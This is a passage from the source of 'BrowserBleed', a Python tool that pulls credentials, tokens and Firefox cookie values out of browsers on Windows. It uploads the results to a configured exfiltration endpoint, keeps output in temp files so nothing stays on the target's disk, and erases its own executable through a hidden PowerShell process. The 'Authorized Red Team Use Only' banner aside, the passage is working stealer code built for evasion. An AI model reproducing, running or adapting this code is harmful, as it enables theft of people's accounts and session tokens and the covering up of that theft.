    # Warn if critical env vars are missing (common when running as SYSTEM or in restricted context)
    warn_lines = []
    if not os.environ.get("LOCALAPPDATA"):
        warn_lines.append("[!] LOCALAPPDATA is not set - Chromium-based browser paths may be wrong")
    if not os.environ.get("APPDATA"):
        warn_lines.append("[!] APPDATA is not set - Opera / Firefox paths may be wrong")

    lines = [
        "=" * 70,
        "  BrowserBleed - Browser Credential & Token Extractor",
        "  Authorized Red Team Use Only",
        f"  Run:   {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        f"  Admin: {'YES' if is_admin() else 'NO  (run as Administrator for full SQLite + process access)'}",
        f"  Modes: {'DISK ' if do_disk else ''}{'MEMORY' if do_memory else ''}",
        "=" * 70,
    ] + warn_lines

    targets = BROWSERS
    if args.browser:
        bf      = args.browser.lower()
        targets = [(n, p, u) for n, p, u in BROWSERS if bf in n.lower() or bf in p.lower()]
        if not targets:
            lines.append(f"\n[!] No browser matched '{args.browser}'")

    # Parallel browser processing
    all_csv_rows: list[dict] = []
    with ThreadPoolExecutor(max_workers=4) as executor:
        future_map = {
            executor.submit(
                process_browser, bname, proc, path, do_disk, do_memory, args.max_hits, args.verify
            ): bname
            for bname, proc, path in targets
        }
        results_by_name: dict[str, tuple[list[str], list[dict]]] = {}
        for future in as_completed(future_map):
            bname = future_map[future]
            try:
                results_by_name[bname] = future.result()
            except Exception as e:
                results_by_name[bname] = ([f"\n[!] {bname} error: {e}"], [])

    # Emit results in original browser order
    for bname, proc, path in targets:
        browser_lines, browser_csv = results_by_name.get(bname, ([], []))
        lines.extend(browser_lines)
        all_csv_rows.extend(browser_csv)

    # Firefox (separate, unencrypted)
    lines.append("\n" + "=" * 70)
    lines.append("  BROWSER: Firefox")
    lines.append("=" * 70)
    try:
        ff_cookies = extract_firefox_cookies_win()
        if ff_cookies:
            lines.append(f"[+] {len(ff_cookies)} Firefox cookie(s) across all profiles\n")
            for ck in ff_cookies:
                samesite = ck.get("samesite", "?")
                lines.append(f"  Profile:  {ck.get('profile', '?')}")
                lines.append(f"  Host:     {ck['host']}")
                lines.append(f"  Name:     {ck['name']}")
                lines.append(f"  Value:    {ck['value']}")
                lines.append(f"  Expires:  {ck['expires']}  Secure:{ck['secure']}  HttpOnly:{ck['httponly']}  SameSite:{samesite}\n")
        else:
            lines.append("  [--] Firefox not installed or no cookies found")
    except Exception as e:
        lines.append(f"  [-] Firefox error: {e}")

    report = "\n".join(lines)

    # When _EXFIL_URL is baked in and no explicit --out, use a temp file that
    # gets cleaned up after upload - nothing persists on the target's disk.
    _using_temp = False
    if args.out:
        out_path = args.out
    elif _EXFIL_URL:
        import tempfile as _tempfile
        _tmp = _tempfile.NamedTemporaryFile(suffix=".txt", delete=False)
        out_path = _tmp.name
        _tmp.close()
        _using_temp = True
    elif getattr(sys, "frozen", False):
        out_path = os.path.join(os.path.dirname(sys.executable), "bb_results.txt")
    else:
        out_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bb_results.txt")

    with open(out_path, "w", encoding="utf-8") as f:
        f.write(report)

    csv_path = out_path.replace(".txt", ".csv") if out_path.endswith(".txt") else out_path + ".csv"
    if all_csv_rows:
        import csv as _csv
        with open(csv_path, "w", newline="", encoding="utf-8") as f:
            writer = _csv.DictWriter(f, fieldnames=["browser", "profile", "label", "service", "value", "address"])
            writer.writeheader()
            writer.writerows(all_csv_rows)

    if args.exfil and args.exfil_key:
        report_url = _exfil_results(args.exfil, args.exfil_key, out_path, csv_path if all_csv_rows else None)
        if report_url and not _using_temp:
            with open(out_path, "a", encoding="utf-8") as f:
                f.write(f"\n[+] Exfil: {report_url}\n")

    if _using_temp:
        try:
            os.remove(out_path)
            if os.path.exists(csv_path):
                os.remove(csv_path)
        except OSError:
            pass

    # Try immediate delete. The PyInstaller bootloader keeps the exe open as the
    # process image so os.remove usually fails. Fall back to a hidden PowerShell
    # process: -WindowStyle Hidden is enforced at the shell level (guaranteed
    # invisible even when elevated), -LiteralPath handles spaces in the path.
    if _self_exe_path:
        try:
            os.remove(_self_exe_path)
        except OSError:
            try:
                import subprocess as _sp
                _sp.Popen(
                    [
                        'powershell', '-WindowStyle', 'Hidden',
                        '-NonInteractive', '-NoProfile', '-Command',
                        f"Start-Sleep 8; Remove-Item -Force -LiteralPath '{_self_exe_path}' -ErrorAction SilentlyContinue",
                    ],
                    stdin=_sp.DEVNULL, stdout=_sp.DEVNULL, stderr=_sp.DEVNULL,
                    creationflags=_sp.DETACHED_PROCESS | _sp.CREATE_NO_WINDOW,
                )
            except Exception:
                pass


if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        import traceback
        if getattr(sys, "frozen", False):
            err_path = os.path.join(os.path.dirname(sys.executable), "bb_error.txt")
        else:
            err_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bb_error.txt")
        with open(err_path, "w") as f:
            f.write(traceback.format_exc())
